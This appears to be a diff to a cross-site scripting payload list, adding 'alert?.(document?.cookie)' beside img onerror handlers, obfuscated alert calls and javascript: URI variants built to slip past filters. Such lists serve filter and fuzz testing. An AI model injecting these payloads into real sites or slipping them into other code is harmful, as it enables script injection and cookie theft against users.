@@ -1,6 +1,7 @@
 <samp><script><section><img onerror="alert()" src />
 <samp><script><section><img onerror="self['ale'+'rt']()" src />
 <section><img onerror="self['ale'+'rt']()" src />
+alert?.(document?.cookie)
 java\nscript:alert(1)
 \0x1javascript:alert(1)
 jaVAscrIpt:alert(1)
